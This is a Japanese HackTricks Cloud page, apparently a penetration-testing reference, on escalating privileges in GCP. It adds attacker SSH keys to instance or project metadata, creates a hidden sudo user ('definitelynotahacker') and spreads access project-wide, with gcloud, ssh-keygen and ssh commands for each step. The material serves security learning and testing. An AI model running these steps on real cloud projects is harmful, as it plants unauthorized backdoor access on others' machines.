# GCP - カスタムSSHメタデータの追加

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポート</summary>

* [**購読プラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するためにPRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**してください。

</details>
{% endhint %}

## メタデータの変更 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

インスタンスのメタデータの変更は、**攻撃者が必要な権限を取得した場合には重大なセキュリティリスク**につながる可能性があります。

### カスタムメタデータへのSSHキーの組み込み

GCPでは、**Linuxシステム**はしばしば[Google Compute Engine用Python Linuxゲスト環境](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)からスクリプトを実行します。これの重要なコンポーネントは[アカウントデーモン](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)で、これは**定期的に**インスタンスのメタデータエンドポイントをチェックして**認証済みSSH公開キーの更新**を行います。

したがって、攻撃者がカスタムメタデータを変更できれば、デーモンが新しい公開キーを見つけ、それが処理されて**ローカルシステムに統合**されるようにすることができます。そのキーは既存のユーザーの`~/.ssh/authorized_keys`ファイルに追加されるか、キーの形式に応じて`sudo`権限を持つ新しいユーザーが作成される可能性があります。そして、攻撃者はホストを侵害できるようになります。

### 既存の特権ユーザーにSSHキーを追加する

1. **インスタンス上の既存のSSHキーを調べる:**
- インスタンスとそのメタデータを説明するコマンドを実行して、既存のSSHキーを特定します。出力の関連セクションは`metadata`の下にあり、特に`ssh-keys`キーの下にあります。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSHキーの形式に注意してください：ユーザー名はコロンで区切られたキーの前にあります。

2. **SSHキーのメタデータ用のテキストファイルを準備する:**
- ユーザー名とそれに対応するSSHキーの詳細を`meta.txt`という名前のテキストファイルに保存します。これは新しいキーを追加する際に既存のキーを保持するために重要です。

3. **ターゲットユーザー(`alice`を例として)の新しいSSHキーを生成する:**
- `ssh-keygen`コマンドを使用して新しいSSHキーを生成し、コメントフィールド(`-C`)がターゲットのユーザー名と一致することを確認します。
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- インスタンスのメタデータで見つかった形式に準じて、新しい公開キーを`meta.txt`に追加します。

4. **インスタンスのSSHキーのメタデータを更新する:**
- `gcloud compute instances add-metadata`コマンドを使用して、更新されたSSHキーのメタデータをインスタンスに適用します。
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **新しいSSHキーを使用してインスタンスにアクセスする:**
- 新しいキーを使用してSSHでインスタンスに接続し、ターゲットユーザー(`alice`を例として)のコンテキストでシェルにアクセスします。
```bash
ssh -i ./key alice@localhost
sudo id
```

### 新しい特権ユーザーを作成してSSHキーを追加する

興味深いユーザーが見つからない場合、`sudo`権限が与えられる新しいユーザーを作成することが可能です。
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### プロジェクトレベルでのSSHキー <a href="#sshing-around" id="sshing-around"></a>

クラウド環境内の複数の仮想マシン（VM）へのSSHアクセス範囲を広げるために、**プロジェクトレベルでSSHキーを適用**することが可能です。このアプローチにより、プロジェクト内の任意のインスタンスにSSHアクセスできるようになります（プロジェクト全体のSSHキーが明示的にブロックされていない場合）。以下は要約したガイドです：

1. **プロジェクトレベルでSSHキーを適用：**
- `gcloud compute project-info add-metadata`コマンドを使用して、`meta.txt`からSSHキーをプロジェクトのメタデータに追加します。この操作により、SSHキーがプロジェクト内のすべてのVMで認識されるようになります。ただし、VMが「プロジェクト全体のSSHキーをブロックする」オプションを有効にしていない限りです。
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **プロジェクト全体のキーを使用してインスタンスにSSHする：**
- プロジェクト全体のSSHキーが設定されている場合、プロジェクト内の任意のインスタンスにSSHできます。プロジェクト全体のキーをブロックしていないインスタンスはSSHキーを受け入れ、アクセスを許可します。
- インスタンスに直接SSHする方法は、`gcloud compute ssh [INSTANCE]`コマンドを使用することです。このコマンドは、現在のユーザー名とプロジェクトレベルで設定されたSSHキーを使用してアクセスを試みます。


# 参考文献
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
